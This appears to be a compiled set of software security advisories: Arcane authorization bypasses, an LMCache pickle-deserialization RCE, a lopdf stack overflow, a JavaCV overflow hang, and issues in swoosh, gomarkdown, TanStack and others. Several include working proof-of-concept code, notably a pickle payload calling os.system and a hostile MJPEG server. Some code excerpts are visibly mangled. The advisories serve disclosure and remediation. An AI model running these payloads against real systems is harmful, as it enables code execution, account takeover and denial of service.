Arcane: Delegated users:update permission allows admin account takeover via password reset (no privilege-hierarchy check)
items.summary: ## Summary A user holding the delegated `users:update` permission can reset the global administrator's password and take over the admin account. `UpdateUser` sets the target user's `PasswordHash` from the request body for ANY target with no comparison of caller-vs-target privilege. Because role assignment and role CRUD are deliberately gated by `RequireGlobalAdmin`, `users:update` is intended to sit BELOW admin (profile management); this finding defeats that separation. ## Root Cause `UpdateUser` (handler `backend/api/handlers/users.go:317-323`) loads the target by ID and sets `userModel.PasswordHash` from the request body for any user, then `userService.UpdateUser` (`user_service.go:174`) simply `tx.Save`s — with NO actor-vs-target privilege comparison. The only `IsGlobalAdmin` guard (`user_service.go:345`) is a last-admin check inside `DeleteUser`, not the update path. Role assignment / role CRUD are `RequireGlobalAdmin` (`backend/pkg/authz/permissions.go:27-33`), proving `users:update` is intended below admin. ## Impact Complete administrator account takeover (C:H/I:H/A:H) by any holder of the delegated `users:update` permission. ## Proof of Concept 1. Admin delegates a custom "User Manager" role with `users:update`. 2. `PUT /users/{adminId}` with `{"password":"attacker123"}`. 3. `POST /auth/login {"username":"arcane","password":"attacker123"}` → admin session. ## Attack Chain 1. Action: admin delegates custom role with `users:update`. Guard: role creation is `RequireGlobalAdmin`. Bypass: intended delegation (holder is meant to manage profiles, not seize admin). 2. Action: `PUT /users/{adminId}` `{"password":"attacker123"}`. Guard: `RequirePermission(users:update)` (`users.go:154`). Bypass: holder has it; no hierarchy check (`users.go:317-323`, `user_service.go:174` unconditional Save). 3. Action: `POST /auth/login` as admin → admin session. ## Bypass Evidence - `users.go:317-323` sets `PasswordHash` for any target; `user_service.go:174-194` has no actor/target privilege comparison. - Only `IsGlobalAdmin` hits are `DeleteUser`'s last-admin guard and DTO flags (grep). - `users:update` is org-level, held by no built-in non-admin role (`permissions.go:24`). ## Affected Versions `<= 2.5.0`. Reported by **zx (Jace)** — GitHub: @manus-use

items.title: Arcane: Environment access token bypasses the admin-required authorization gate on `/api/debug/pprof`
items.summary: ## Summary Arcane v2.10.2 contains an authorization inconsistency in `AuthMiddleware.managerAuth`. When a request supplies a valid environment access token through the `X-Arcane-Agent-Token` header, `managerAuth` resolves the associated environment, installs an environment-scoped permission set, and immediately calls `next(c)`. This occurs before the middleware evaluates the `AdminRequired` option and verifies that the caller is a global administrator. As a result, an environment-scoped access token can access routes protected with `WithAdminRequired()`, despite the corresponding `EnvironmentPermissionSet` intentionally containing no global or sudo permissions. In v2.10.2, the affected admin-only surface is the manager's Go `pprof` diagnostic interface under: `/api/debug/pprof/*` This exposes diagnostic and runtime profiling information that the application explicitly intends to restrict to global administrators. The issue is an incorrect authorization vulnerability (CWE-863). ## Details ### 1. Environment access tokens are accepted by the manager authentication middleware The production authentication middleware is configured with an environment access-token resolver: `backend/internal/di/providers.go` Conceptually, the middleware is constructed as: ```go auth.NewAuthMiddleware(authService, cfg). WithApiKeyValidator(apiKey). WithEnvironmentAccessTokenResolver(env). WithPermissionResolver(role) ``` Therefore, the `X-Arcane-Agent-Token` authentication path is active in the production manager. ### 2. The environment-token path returns before authorization options are evaluated The relevant logic is in: `backend/internal/auth/middleware.go` `managerAuth` first checks the `X-Arcane-Agent-Token` header. When the token resolves to an environment, the middleware installs an environment-scoped permission set and immediately continues processing: ```go if agentToken := req.Header.Get(utils.HeaderAgentToken); agentToken != "" { if env, ok := m.resolveEnvironmentAccessToken(ctx, agentToken).Get(); ok { environmentScopedInternal(c, env) return next(c) } } ``` The important part is the unconditional: ```go return next(c) ``` The normal authentication path later evaluates the middleware's `AdminRequired` option: ```go ps := m.resolvePermissionsOrDeny(ctx, user) if m.options.AdminRequired && !ps.IsGlobalAdmin() { return c.JSON(http.StatusForbidden, common.APIError{ Code: "FORBIDDEN", Message: "You don't have permission to access this resource", }) } ``` The environment-token branch never reaches this check. Consequently, `WithAdminRequired()` has no effect when authentication succeeds through a valid environment access token. This creates an authorization inconsistency between authentication mechanisms: - normal user/session authentication → `AdminRequired` is enforced; - environment access-token authentication → `AdminRequired` is bypassed. ### 3. Environment tokens are intentionally not global-administrator credentials `backend/pkg/authz/permission_set.go` defines the effective permissions assigned to an environment access token. `EnvironmentPermissionSet(envID)` grants environment-scoped permissions only for the specified environment: ```go func EnvironmentPermissionSet(envID string) *PermissionSet { ps := NewPermissionSet() if envID == "" { return ps } for _, p := range AllPermissions() { if IsEnvScoped(p) { ps.AddEnv(envID, p) } } return ps } ``` The implementation explicitly establishes that these credentials do not receive global or sudo permissions. Therefore, an environment access token should not satisfy a global-administrator authorization requirement. The early return in `managerAuth` bypasses this intended privilege boundary. ### 4. `/api/debug/pprof/*` explicitly requires global-administrator authorization The diagnostic routes are registered in: `backend/api/ws/diagnostics.go` The `pprof` group is protected using: ```go pprofGroup := group.Group( "/debug/pprof", authMiddleware.WithAdminRequired().Add(), ) ``` The source also documents the intended authorization requirement by noting that pprof keeps the stricter admin-required gate. The group exposes handlers including: ```text /api/debug/pprof/ /api/debug/pprof/cmdline /api/debug/pprof/profile /api/debug/pprof/symbol /api/debug/pprof/trace /api/debug/pprof/heap /api/debug/pprof/goroutine /api/debug/pprof/allocs /api/debug/pprof/block /api/debug/pprof/mutex /api/debug/pprof/threadcreate ``` Named profiles are dispatched through `pprof.Handler`. Because `WithAdminRequired()` is bypassed by the environment-token branch, a valid environment access token can reach these handlers even though its permission set is not globally privileged. ### 5. Other middleware does not restore the missing authorization check The CSRF middleware recognizes `X-Arcane-Agent-Token` as a header-based credential and does not apply the normal cross-origin CSRF validation to such requests. Additionally, the environment proxy middleware passes through requests that do not target an `/environments/{id}/...` path. Therefore a request to: ```text /api/debug/pprof/* ``` can proceed to `managerAuth`, enter the environment-token authentication branch, and reach the pprof handler without another global-administrator authorization check being applied. ## Source-to-sink authorization path The vulnerable control flow is: ```text X-Arcane-Agent-Token | v environment access token resolver | v environment resolved successfully | v EnvironmentPermissionSet(environmentID) | v return next(c) | | AdminRequired check is skipped v /api/debug/pprof/* | v net/http/pprof handler ``` The security boundary violation occurs at the early `return next(c)`. ## Proof of Concept ### Preconditions The test requires: 1. A valid Arcane environment access token. 2. An Arcane manager running the affected code. 3. No global-administrator account or credentials. ### Test 1 — environment access token Send a request to an admin-protected pprof endpoint using only an environment access token: ```http GET /api/debug/pprof/heap?debug=1 HTTP/1.1 Host: arcane.example.com X-Arcane-Agent-Token: ``` No administrator session cookie or administrator Bearer token is supplied. ### Vulnerable behavior On an affected instance, the request is expected to reach the pprof handler instead of being rejected by `WithAdminRequired()`. A successful response demonstrates that the environment-token authentication branch bypasses the administrator requirement. For example, the response may contain the Go heap profiling output generated by `net/http/pprof`. ### Test 2 — non-admin user contrast case Send the same request using a normal authenticated non-global-admin user: ```http GET /api/debug/pprof/heap?debug=1 HTTP/1.1 Host: arcane.example.com Authorization: Bearer ``` The expected result is: ```http HTTP/1.1 403 Forbidden ``` with an authorization error indicating that the user does not have permission to access the resource. This contrast demonstrates the authorization inconsistency: ```text environment-scoped token -> admin gate skipped -> pprof handler reached normal non-admin user -> admin gate evaluated -> HTTP 403 ``` ### Expected secure behavior A valid environment access token should receive: ```http HTTP/1.1 403 Forbidden ``` for every route protected with `WithAdminRequired()`. Only a caller whose effective permission set satisfies `IsGlobalAdmin()` should be allowed to access these routes. ## Impact An attacker who obtains a valid environment access token can cross the intended authorization boundary between an individual environment and manager-wide administrative functionality. In the currently identified route configuration, this allows unauthorized access to the manager's Go `pprof` diagnostic endpoints. Depending on the requested profile, these endpoints can expose internal runtime and diagnostic information such as: - goroutine stack traces; - function and package names; - allocation and heap profiling information; - CPU profiling information; - runtime execution traces; - process command-line information; - mutex, block, thread and allocation profiling data. This information is normally restricted to global administrators by Arcane's explicit use of `WithAdminRequired()`. Some profiling operations may also impose additional CPU, memory, or tracing overhead while being collected. Importantly, this report does **not** assume that Go's pprof heap endpoint is an arbitrary raw-process-memory dump. Direct extraction of session tokens, environment access tokens, passwords, or other credentials from pprof output has not been demonstrated and is therefore not claimed as part of the confirmed impact. The confirmed security issue is the authorization bypass itself and the resulting unauthorized exposure of administrator-restricted diagnostic functionality. ## Root Cause The root cause is that authentication through an environment access token takes an early-success path: ```go environmentScopedInternal(c, env) return next(c) ``` before common middleware authorization options are evaluated. As a result, authorization requirements configured on the middleware are dependent on which authentication mechanism is used. Authentication establishes the identity and scope of the caller, but route-level authorization requirements such as `AdminRequired` should subsequently be applied consistently regardless of the authentication mechanism. ## Remediation The environment-token authentication path should not call `next(c)` before the configured authorization requirements have been evaluated. One approach is to resolve the environment token into its `EnvironmentPermissionSet` and then pass that permission set through the same authorization-option evaluation used by other authentication mechanisms. For example, logically: ```go if envTokenIsValid { ps := authz.EnvironmentPermissionSet(env.ID) if m.options.AdminRequired && !ps.IsGlobalAdmin() { return forbidden } environmentScopedInternal(c, env) return next(c) } ``` Because an `EnvironmentPermissionSet` intentionally has no global permissions, an environment token would then correctly receive HTTP 403 for `WithAdminRequired()` routes. As additional defense in depth, the pprof endpoints could explicitly reject environment access tokens and other environment-scoped authentication mechanisms, allowing access only through authentication mechanisms capable of representing a global administrator. It may also be worth considering whether pprof should be exposed in production by default or enabled only through an explicit diagnostic configuration option. ## Regression Tests The following cases should be covered: ```text Valid environment access token + /api/debug/pprof/heap => 403 Normal authenticated non-admin user + /api/debug/pprof/hea => 403 Unauthenticated request + /api/debug/pprof/heap => 401/403 Global administrator + /api/debug/pprof/heap => 200 ``` More generally, tests should verify that every authentication mechanism is subject to middleware options such as `AdminRequired`. The issue could also broadly be categorized as an authorization-check bypass caused by inconsistent authorization handling across authentication paths.. No claim of credential extraction, arbitrary process-memory disclosure, or global-administrator takeover is made unless separately demonstrated through dynamic testing.

items.title: LMCache: Remote code execution via unsafe deserialization in multiprocess mode transport
items.summary: ### Summary LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport ### Details LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines. Messages on the socket are msgpack. Extension code 1 is registered for DeviceIPCWrapper and is passed to DeviceIPCWrapper.Deserialize in lmcache/v1/platform/base/ipc_wrapper.py, which calls pickle.loads. That hook runs from ext_hook in lmcache/v1/multiprocess/custom_types.py while the server is still decoding REGISTER_KV_CACHE arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root. The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published. ### Proof of concept Step 1 - Start multiprocess mode bound to a routable address This is the documented multi-node setting. The ZMQ transport listens on port 5555. ``` python -m lmcache.v1.multiprocess.http_server \ --http-host 127.0.0.1 --http-port 8080 \ --host 0.0.0.0 --port 5555 \ --l1-size-gb 0.25 --eviction-policy LRU \ --hash-algorithm blake3 --instance-id mp-node-01 ``` Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes id to /tmp/zmq_pwn. ``` import os import pickle import msgspec import zmq class EvilPayload: def __init__(self, cmd): self.cmd = cmd def __reduce__(self): return (os.system, (self.cmd,)) evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1")) REGISTER_KV_CACHE = 1 EXT_CODE = 1 NUM_PAYLOADS = 7 KVCACHE_INDEX = 1 b_uid = msgspec.msgpack.encode(0) b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE) payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS payloads[0] = msgspec.msgpack.encode(0) payloads[KVCACHE_INDEX] = msgspec.msgpack.encode( [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)] ) frames = [b_uid, b_type, *payloads] ``` Step 3 - Send the frame ``` ctx = zmq.Context() s = ctx.socket(zmq.DEALER) s.connect("tcp://127.0.0.1:5555") s.send_multipart(frames) ``` The pickle runs during argument decode. The server then logs a type error for REGISTER_KV_CACHE because the handler expected a DeviceIPCWrapper and received the return value of os.system. That error is after the command has already run. Step 4 - Confirm the command ran as the LMCache user ``` cat /tmp/zmq_pwn ``` Expected output on an official image, where the process runs as root: ``` uid=0(root) gid=0(root) groups=0(root) ``` ### Impact LMCache's multiprocess (MP) mode uses a ZeroMQ transport (port 5555 by default) that does not require authentication. Device IPC descriptors received on this transport were deserialized with `pickle.loads`. An attacker who can reach the transport port can send a single crafted message and execute arbitrary code with the privileges of the LMCache process. By default the transport binds to localhost, and single-process (in-process) mode does not open the port. Deployments are exposed when the transport binds a routable address, as multi-node setups do. The project's example Kubernetes deployment bound all interfaces, and official container images ran as root, so deployments based on them should be treated as exposed. Affected: 0.3.9 through 0.5.5, the 0.5.6 release candidates, and `dev` branch builds before PR #5644. ### Patches Fixed in **0.5.6**. Pickle has been replaced with versioned, typed MessagePack descriptors that are validated before use; the device wrapper type is selected from a fixed local allowlist, and there is no pickle fallback. Both the ZeroMQ and gRPC transport paths are covered. The wire format has changed: upgrade all workers and servers together. 0.5.6 also binds the example Kubernetes deployment to localhost (PR #5684) and runs official images as a non-root user (PR #5685). ### Workarounds Until you can upgrade: - Do not bind the transport to a routable address; keep it on localhost or a trusted cluster network. - Restrict access to the transport port (5555 by default) with firewall rules or network policies. - Run LMCache as a non-root user (build from the provided Dockerfile if needed). If the transport port was ever reachable from an untrusted network, treat the host as potentially compromised: review connections to the port, check for unexpected processes or outbound connections from the LMCache process, rotate reachable credentials, and redeploy from clean images.

items.title: lopdf has a stack overflow via deeply nested PDF objects
items.summary: `lopdf::Document::load_mem` (and the other `load*` entry points) parses nested PDF arrays and dictionaries with unbounded recursion. A small crafted PDF whose Catalog contains a deeply nested array (`/X [[[ … ]]]`, on the order of 10,000 levels) exhausts the call stack and aborts the process with `SIGABRT`. Because this is a stack-overflow abort rather than a `panic!`, it cannot be caught with `catch_unwind`: any service that parses untrusted PDF input with lopdf can be crashed by a ~21 KB file, resulting in a denial of service. Confirmed on lopdf 0.41.0 and earlier; fixed in 0.42.0. Default configuration, no features changed. ## Proof of concept ```rust fn main() { let bytes = std::fs::read("poc.pdf").unwrap(); // ~10,380-deep nested array in the Catalog let _ = lopdf::Document::load_mem(&bytes); // stack overflow -> SIGABRT } ``` An equivalent PoC is a minimal PDF whose Catalog `/X` value is `"[" * 10380 + "]" * 10380`. ## Suggested fix Enforce a maximum object-nesting depth in the parser and return an `Err` instead of recursing without bound.

items.title: JavaCV: Integer Overflow in IPCameraFrameGrabber Causes Infinite-Loop DoS
items.summary:
### Summary `IPCameraFrameGrabber` parses the `Content-Length` value from the multipart MJPEG HTTP stream returned by the configured IP camera without any bounds checking. A malicious or compromised camera endpoint - or any network attacker able to tamper with the plaintext HTTP response (these streams are conventionally accessed over `http://`, as documented in the class itself) - can supply a `Content-Length` value in the range `1073741825`-`2147483647`. This drives the internal buffer-growth routine `ensureBufferCapacity(int)` into 32-bit signed integer overflow, which turns the "grow the buffer" loop into a true infinite loop: the loop variable oscillates to `0` and never again satisfies the loop's exit condition. The thread that called `grab()`/`grabBufferedImage()` spins at 100% CPU forever and never returns, permanently hanging the calling application's frame-grabbing thread with no exception, timeout, or interrupt path available to the caller. ### Details File: `src/main/java/org/bytedeco/javacv/IPCameraFrameGrabber.java` ```java private byte[] readImage() throws IOException { ... int c0 = subheader.indexOf("content-length: "); final int c1 = subheader.indexOf('', c0); if (c0 pixelBuffer.length) { pixelBuffer = new byte[capacity]; } } ``` `contentLength` is taken verbatim from the HTTP response headers of the camera stream and passed directly into `ensureBufferCapacity` with no upper-bound validation (the comment "adaptive size - careful - don't want a 2G jpeg" shows the author was aware of the risk but never implemented a check). `ensureBufferCapacity` repeatedly doubles `capacity` (a 32-bit `int`, starting at `pixelBuffer.length == 1024`) until it is `>= desiredCapacity`. If `desiredCapacity` is greater than `2^30` (`1073741824`) but `<= Integer.MAX_VALUE` (`2147483647`): 1. `capacity` reaches `2^30` (`1073741824`) after 20 doublings; the loop condition `capacity < desiredCapacity` is still true. 2. `capacity *= 2` computes `2^31`, which overflows a signed 32-bit `int` and wraps to `Integer.MIN_VALUE` (`-2147483648`). 3. The loop condition `capacity < desiredCapacity` (a negative number compared to a large positive `desiredCapacity`) is still true, so the loop continues. 4. `capacity *= 2` computes `Integer.MIN_VALUE * 2`, which in two's-complement 32-bit arithmetic wraps to `0`. 5. From this point on, `capacity` is permanently `0` (`0 * 2 == 0`), and `0 < desiredCapacity` remains true forever - the `while` loop never terminates. This is a pure CPU-bound loop with no I/O, no blocking call, and no `InterruptedException` check, so it cannot be interrupted via `Thread.interrupt()` and will not respect any `readTimeout`/`connectionTimeout` configured on the grabber (those only apply to the socket read that happens *before* this code path). The only remedy is killing the JVM/thread from outside. ### PoC A minimal malicious/MITM'd MJPEG server that reproduces the hang: ```python import socket srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM) srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) srv.bind(("0.0.0.0", 8080)) srv.listen(1) print("listening on :8080") conn, _ = srv.accept() conn.recv(4096) # swallow the client's request # Any value in (1073741824, 2147483647] triggers the overflow. malicious_length = 2000000000 header = ( "--myboundary
" "Content-Type: image/jpeg
" "Content-Length: %d

" % malicious_length ) conn.sendall(header.encode()) # The client will now spin forever inside ensureBufferCapacity() # before ever attempting to read the (fake) body. ``` Java client (representative of any application embedding javacv to view an "IP camera" URL): ```java import org.bytedeco.javacv.IPCameraFrameGrabber; import java.util.concurrent.TimeUnit; public class Poc { public static void main(String[] args) throws Exception { IPCameraFrameGrabber grabber = new IPCameraFrameGrabber( "http://127.0.0.1:8080/videostream.cgi", 5, 5, TimeUnit.SECONDS); grabber.start(); grabber.grab(); // never returns; thread pegs a CPU core at 100% forever } } ``` Running the client against the malicious server above causes `grab()` to hang permanently, consuming a full CPU core, regardless of the `startTimeout`/`grabTimeout` passed to the constructor. ### Impact Any application that uses `IPCameraFrameGrabber` to consume a camera/MJPEG stream from a source that is not fully trusted - including the common case of plain `http://` streams (as shown in the class's own documented examples: `http://host/videostream.cgi?...`) that can be tampered with by a network-position attacker - can be forced into a permanent, unrecoverable CPU-spinning hang of the grabbing thread by a single crafted response header. No authentication, JPEG payload, or actual data transfer is required; the malicious header alone is sufficient. Repeated exploitation against a server that spawns a grabber thread per client/camera (a common pattern for video-surveillance/monitoring backends) can exhaust available threads/CPU, resulting in a broader denial of service.

items.title: Claude Agent SDK: Argument Injection via resume Option Allows Arbitrary Command Execution
items.summary: The Claude Agent SDK for Python passed the `resume` option to the Claude CLI without validation, allowing a value beginning with `-` to be interpreted as a separate CLI flag. An attacker who controlled the `resume` value could inject an `--mcp-config` flag defining a stdio MCP server, resulting in arbitrary command execution at CLI startup that bypassed the SDK's permission controls. Exploitation required an application to pass untrusted input as the session ID to resume. Users are advised to update to the latest version of the claude-agent-sdk package. Thank you to hackerone.com/moamenmahmood for reporting this issue.

items.title: ckan-mcp-server: DataStore Table UI resource does not validate postMessage origin (in) and posts to targetOrigin "*" (out)
items.summary: ## Summary The MCP Apps UI resource (an interactive DataStore table rendered in the host's webview/iframe) communicates with its parent via `postMessage`. Its inbound `message` listener performs no `event.origin` validation, and its outbound messages are sent with target origin `'*'`. Any window/frame able to reach the document can inject data into the table and interfere with the MCP UI handshake, and the UI's own JSON-RPC messages are broadcast without an origin restriction. ## Affected code `src/resources/datastore-table-ui.ts` (inline HTML): ```js window.addEventListener('message', function (event) { var msg = event.data; // no check of event.origin if (!msg || typeof msg !== 'object') return; if (msg.id !== undefined && _pending[msg.id]) { ... resolve/reject pending MCP request ... } ... if (data && (data.fields || data.records)) initTable(data); // renders attacker-supplied data }); // outbound: window.parent.postMessage({ jsonrpc: '2.0', id: id, method: method, params: params || {} }, '*'); mcpNot: window.parent.postMessage({ jsonrpc:'2.0', method:method, params:params||{} }, '*'); ``` There is no allowlist of accepted origins for inbound messages and no fixed target origin for outbound messages. ## Impact - **Content spoofing.** A frame that can `postMessage` to the UI can supply arbitrary `fields`/`records`, causing the table to render fabricated rows and links (e.g. a phishing `__link_url`) that appear to come from the queried portal. (Values are HTML-escaped, so this is display spoofing, not script injection — no XSS.) - **Handshake/UX interference.** Because inbound messages matching a pending `id` resolve/reject the UI's MCP requests, an attacker frame can spoof responses to the `ui/initialize` handshake or otherwise disrupt the panel. - **Outbound leakage.** Posting to `'*'` means the UI's JSON-RPC messages are delivered to whatever the parent origin is; if the resource is ever embedded by a context other than the trusted host, those messages leak to it. Exploitability depends on the host embedding model (in a correct MCP Apps host the parent is the trusted host, which limits who can message the frame), so this is a hardening / defense-in-depth issue rather than a directly remotely-triggerable one — hence Low. ## Proof of concept - `poc/verify-no-origin-check.mjs` — static confirmation that the listener has no origin check and outbound uses `'*'`: ``` [x] validates event.origin : NO [x] outgoing postMessage targetOrigin : '*' (any) RESULT: VULNERABLE ``` - `poc/parent-spoof-poc.html` — a page that embeds the UI and injects fabricated rows cross-origin with no handshake; the UI renders them. ## Remediation - Validate `event.origin` against the expected host origin on every inbound message; drop messages from other origins. - Send outbound `postMessage` with an explicit target origin (the host origin established at initialize time) instead of `'*'`. - Optionally, bind to a nonce/channel established during `ui/initialize` so only the negotiated host can drive the panel.

items.title: swoosh has email-derived URL path injection in Microsoft Graph endpoint
items.summary: ### Summary `Swoosh.Adapters.MsGraph` builds its Microsoft Graph API request URL by interpolating the sender's email address directly into the URL path (`/users/{from}/sendMail`) without percent-encoding or validation. In applications that derive the `from` address from untrusted or user-influenced input (a relay, a contact form, or a "send as" feature), an attacker can inject URL-special characters into the local part of the address to escape the intended path segment and rewrite the request's path and query string. Because the rewritten request is still sent as the application's authenticated `POST` with its Microsoft Graph bearer token, the attacker can redirect it to other Graph endpoints within the token's scopes. ### Details The flaw is in `lib/swoosh/adapters/ms_graph.ex`. `api_endpoint_url/2` constructs the Graph endpoint by interpolating the email's `from` address into the path `/users/{from}/sendMail`. The `from` value is taken verbatim from the email struct and is neither percent-encoded nor validated against the RFC 5321 character set before being placed into the URL. `deliver/2` then issues an authenticated `POST` to that constructed URL using the application's Graph bearer token. Because the address sits as the local part of `/users/{from}/sendMail`, characters such as `/`, `?`, and `#` are not neutralized. A `/` lets the attacker append or replace additional path segments, a `?` starts an attacker-controlled query string, and `#` truncates the remainder of the intended path. The result is that the authenticated request can be steered to a different Graph endpoint or carry attacker-chosen query parameters, all under the token's existing scopes. Applications that always send with a fixed, trusted `from` address never reach the injectable path and are unaffected. ### PoC 1. Configure an application to use `Swoosh.Adapters.MsGraph` and derive the email `from` address from user-influenced input (e.g. a contact form's reply address or a "send as" field). 2. Submit a `from` address whose local part contains URL-special characters, for example one using `/`, `?`, or `#` to escape the `/users/{from}/sendMail` path segment. 3. Trigger delivery; Swoosh interpolates the address unencoded and sends the application's authenticated Graph `POST` to the attacker-rewritten path and query string. ### Impact An attacker who can influence the sender address can redirect an application's authenticated Microsoft Graph requests to other endpoints within the bearer token's scopes and control the request's query string, turning the mail-sending path into a constrained server-side request forgery against the Graph API. ### References * Introduction commit: https://github.com/swoosh/swoosh/commit/23bfcdab71aee4613858ba6d116bb3311b72aa58 * Patch commit: https://github.com/swoosh/swoosh/commit/e38235453e81d1727bfc8d91e69ec4cb211ccf61 * Affected adapter source: https://github.com/swoosh/swoosh/blob/master/lib/swoosh/adapters/ms_graph.ex

items.title: ClickMigrate has Path Traversal in "revision -m" argument
items.summary: ### Impact A path traversal vulnerability in the `revision` command allowed a crafted migration name supplied via the `-m` argument to escape the intended migrations directory. Under specific conditions, an attacker could cause the tool to create a `.sql` file in an arbitrary location writable by the user executing the command. This issue is only exploitable if an attacker can influence the migration name passed to the `revision` command, such as through an insecure automation or CI/CD pipeline that forwards untrusted input. ### Patches The vulnerability has been fixed in version 1.0.3 by validating and sanitizing the migration name to prevent directory traversal. Users should upgrade to version 1.0.3 or later. ### Workarounds Do not pass untrusted input to the `revision -m` argument. If upgrading is not immediately possible, ensure that only trusted users or automation can invoke the `revision` command and that migration names are validated before being passed to the tool. ### References - Fix commit: https://github.com/QueueForge/ClickMigrate/commit/6b1f2c0202630a82252b3331aa57e64327e112b6

items.title: gomarkdown/markdown IsSafeURL panics on short URLs
items.summary: ## Summary IsSafeURL slices url[:nPath] before checking that len(url) >= nPath, so a URL shorter than a path prefix (0, 1 or 2 bytes) triggers a slice-bounds panic, and this is reached end to end when the html.Safelink hardening flag is enabled and the input contains an empty or very short link destination, giving an unrecoverable crash DoS. Confirmed at HEAD (e08cff8; present since 2022). ## The defect parser/parser.go, IsSafeURL: ```go func IsSafeURL(url []byte) bool { nLink := len(url) for _, path := range validPaths { // "/", "./", "../" nPath := len(path) linkPrefix := url[:nPath] // line 789: sliced BEFORE the length guard if nLink >= nPath && bytes.Equal(linkPrefix, path) { // line 790: guard is too late ... ``` url[:nPath] is evaluated before the `nLink >= nPath` check. When len(url) = nPath` first, then compute url[:nPath] (or use bytes.HasPrefix(url, path), which is length-safe). One-line change, mirroring the already-correct URIs loop. Also checked and sound: CVE-2026-40890 (smartypants smartLeftAngle OOB) is fixed; CVE-2024-44337 (list/paragraph infinite loop) is fixed (deep nesting capped at maxNesting=64); default XSS is by design (Safelink/SkipHTML not in CommonFlags). ## Tooling AI assistance was used while investigating. The panic is executed-verified with negative controls (IsSafeURL on empty/./.. panics with a slice-bounds error while "/" returns true; ToHTML with html.Safelink on `[x]()` panics while valid and javascript: links do not), and I confirmed at HEAD that IsSafeURL computes url[:nPath] before the `nLink >= nPath` guard.

items.title: Cross-site Scripting (XSS) in serialize-javascript
items.summary: A flaw was found in npm-serialize-javascript. The vulnerability occurs because the serialize-javascript module does not properly sanitize certain inputs, such as regex or other JavaScript object types, allowing an attacker to inject malicious code. This code could be executed when deserialized by a web browser, causing Cross-site scripting (XSS) attacks. This issue is critical in environments where serialized data is sent to web clients, potentially compromising the security of the website or web application using this package.

items.title: TanStack Router: Unauthenticated reflected XSS in TanStack Start server-function responses
items.summary: ## Impact An unauthenticated attacker can craft a URL to a server function in an affected TanStack Start app. If someone opens the link, the app can return attacker-controlled HTML from its own origin and run the attacker's JavaScript there. The script can access same-origin data available to that visitor and make requests with their authority. ## Cause The server-function transport can pass request payload fields into internal middleware state instead of limiting them to public input fields. A malformed payload can leave an attacker-controlled result in the error path. Response handling can then treat a response-shaped object as an HTTP response. ## Affected versions Published versions of `@tanstack/start-server-core`, `@tanstack/react-start`, `@tanstack/solid-start`, and `@tanstack/vue-start` from `1.143.12` up to, but not including, their respective patched versions are affected. The patched versions are `@tanstack/start-server-core@1.169.39`, `@tanstack/react-start@1.168.60`, `@tanstack/solid-start@1.168.57`, and `@tanstack/vue-start@1.168.56`. ## Fix The fix limits client-supplied server-function input to public fields and validates responses at the server boundary. Upgrade to the corresponding patched package version. ## Temporary mitigations For the configured server-function path, usually `/_serverFn/*`, an edge or WAF rule can consider blocking requests without the literal `x-tsr-serverFn: true` header and browser document navigations such as `Sec-Fetch-Mode: navigate` or `Accept: text/html`. A restrictive Content Security Policy on server-function responses can provide another browser-side restriction. These are mitigation suggestions, not a complete fix. The header is client-controlled and is not authentication. Test rules against legitimate GET and POST server functions and use a matching version-specific backport where possible. ## Credits Lovable helped us discover and report this issue. We thank them for their help.

items.title: Pipecat: Public exposure of Pipecat’s development runner can allow unauthenticated bot session creation
items.summary: Pipecat’s built-in development runner exposes endpoints that create bot sessions and, for the Daily transport, paid Daily rooms. These development endpoints intentionally do not authenticate callers. The runner binds to localhost by default and is designed exclusively for local development. It is not built or supported as a production server. Exploitation therefore requires an operator to deliberately make the development runner reachable from an untrusted network, such as by setting --host 0.0.0.0, publishing its port, or using a public tunnel without access controls. If exposed in this way, an unauthenticated caller may invoke endpoints including /start, /daily, and /daily-dialin-webhook. Depending on the endpoint and configuration, this can create a bot session or Daily room and may return a room URL and join token. Repeated requests may also consume local resources and third-party service quotas. The consequences of interacting with a launched bot depend on that bot’s configuration and connected tools. Access to external systems or sensitive information is not an inherent capability of the development runner and is therefore not included as a general impact. Pipecat 1.6.0 clarifies this security boundary in two ways: - The development runner displays a prominent startup banner identifying it as a development tool. - The documentation explicitly states that the runner must not be used as a production server or exposed directly to untrusted traffic. The local development documentation (https://docs.pipecat.ai/pipecat/deployment/running-bots-locally) identifies the unauthenticated endpoints, lack of rate limiting, and risks of public exposure. The production deployment documentation (https://docs.pipecat.ai/pipecat/deployment/running-bots-in-production) directs users to a production dispatcher or managed runtime and describes minimum protections for limited prototype use. ### Resolution > Pipecat 1.6.0 documents and surfaces the intended security boundary of the development runner. The unauthenticated development behavior remains by design. Users must not > expose the runner directly to untrusted networks; production deployments require an authenticated dispatcher or managed runtime.

items.title: Podman: The `podman run` command can be instructed to disable almost all sandboxing by image annotation
